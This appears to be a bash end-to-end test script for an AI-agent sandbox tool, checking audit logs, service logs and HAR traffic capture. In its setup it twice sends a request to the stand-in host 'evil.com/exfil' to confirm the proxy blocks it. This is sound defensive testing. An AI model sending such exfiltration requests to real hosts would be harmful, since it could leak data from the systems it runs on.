#!/usr/bin/env bash
# Phase 2: Container Mode — Audit, Logs & HAR Capture
source "$(dirname "$0")/lib.sh"
preflight_check agentcage podman curl
phase_header 2 "Container Mode — Audit, Logs & HAR Capture"

CAGE="basic"
BASE="http://localhost:3000"
CONFIGS="$(dirname "$0")/configs"

# Ensure the basic cage is running (phase 1 should have created it)
if ! curl -sf "$BASE/" >/dev/null 2>&1; then
  echo "Basic cage not running — creating..."
  destroy_cage "$CAGE"
  register_cage "$CAGE"
  create_cage "$CONFIGS/basic.yaml" >/dev/null
  start_mock "$CAGE" httpbin.org
  wait_ready "$BASE" 120 || { e2e_fail "2.0" "Setup" "cage not ready"; print_results; exit 1; }
  repatch_mock "$CAGE" httpbin.org || true
  # Generate some traffic
  curl -s "$BASE/fetch?url=http://httpbin.org/get" >/dev/null 2>&1 || true
  curl -s "$BASE/fetch?url=http://evil.com/exfil" >/dev/null 2>&1 || true
  # Poll until audit log contains the expected entry (up to 10s)
  _audit_deadline=$((SECONDS + 10))
  while [ "$SECONDS" -lt "$_audit_deadline" ]; do
    if agentcage cage audit "$CAGE" --json-lines -n 10 2>&1 | grep -q '"decision"'; then
      break
    fi
    sleep 1
  done
else
  # Ensure we have blocked traffic for audit tests
  curl -s "$BASE/fetch?url=http://evil.com/exfil" >/dev/null 2>&1 || true
  # Poll until audit log contains the blocked entry (up to 10s)
  _audit_deadline=$((SECONDS + 10))
  while [ "$SECONDS" -lt "$_audit_deadline" ]; do
    if agentcage cage audit "$CAGE" --json-lines -n 10 2>&1 | grep -q '"decision"'; then
      break
    fi
    sleep 1
  done
fi

# Audit tests
assert_output_contains "2.1" "Audit: all entries" '"decision"' \
  agentcage cage audit "$CAGE" --json-lines -n 10

assert_output_contains "2.2" "Audit: blocked only" '"blocked"' \
  agentcage cage audit "$CAGE" -d blocked --json-lines

assert_output_contains "2.3" "Audit: by host" "httpbin.org" \
  agentcage cage audit "$CAGE" --host httpbin.org --json-lines

assert_output_contains "2.4" "Audit: summary" "allowed" \
  agentcage cage audit "$CAGE" --summary

# Log tests
assert_cmd_ok "2.5" "Logs: cage service" \
  agentcage cage logs "$CAGE" -s cage -n 5

assert_cmd_ok "2.6" "Logs: proxy service" \
  agentcage cage logs "$CAGE" -s proxy -n 5

assert_cmd_ok "2.7" "Logs: dns service" \
  agentcage cage logs "$CAGE" -s dns -n 5

# HAR capture tests
e2e_timer_start
HAR_CAGE="e2e-har"
destroy_cage "$HAR_CAGE"
register_cage "$HAR_CAGE"
HAR_PORT="${E2E_PORT_HAR:-19082}"
HAR_BASE="http://localhost:$HAR_PORT"

echo "Creating HAR cage..."
export E2E_PORT_HAR="$HAR_PORT"
create_cage "$CONFIGS/har.yaml" >/dev/null
start_mock "$HAR_CAGE" httpbin.org
if wait_ready "$HAR_BASE" 120; then
  repatch_mock "$HAR_CAGE" httpbin.org || true
  # Generate traffic
  curl -s "$HAR_BASE/fetch?url=http://httpbin.org/get" >/dev/null 2>&1 || true
  # Poll until HAR data is available (up to 15s)
  _har_deadline=$((SECONDS + 15))
  _har_ready=false
  while [ "$SECONDS" -lt "$_har_deadline" ]; do
    if agentcage cage har "$HAR_CAGE" --json-lines -n 1 2>&1 | grep -q '"flow_id"'; then
      _har_ready=true
      break
    fi
    sleep 1
  done

  HAR_FILE=$(mktemp /tmp/e2e-har-XXXXXX.har)
  if agentcage cage har "$HAR_CAGE" --view inbound -o "$HAR_FILE" >/dev/null 2>&1; then
    if python3 -c "import json; json.load(open('$HAR_FILE'))" 2>/dev/null; then
      e2e_pass "2.8" "HAR export (inbound)"
    else
      e2e_fail "2.8" "HAR export (inbound)" "invalid JSON"
    fi
  else
    e2e_fail "2.8" "HAR export (inbound)" "har command failed"
  fi
  rm -f "$HAR_FILE"

  e2e_timer_start
  OUTPUT=$(agentcage cage har "$HAR_CAGE" --json-lines -n 5 2>&1) || true
  if echo "$OUTPUT" | grep -q '"flow_id"'; then
    e2e_pass "2.9" "HAR export (JSONL)"
  else
    e2e_fail "2.9" "HAR export (JSONL)" "missing flow_id in output"
  fi
else
  e2e_fail "2.8" "HAR export (inbound)" "HAR cage not ready"
  e2e_skip "2.9" "HAR export (JSONL)" "depends on 2.8"
fi

destroy_cage "$HAR_CAGE"

print_results
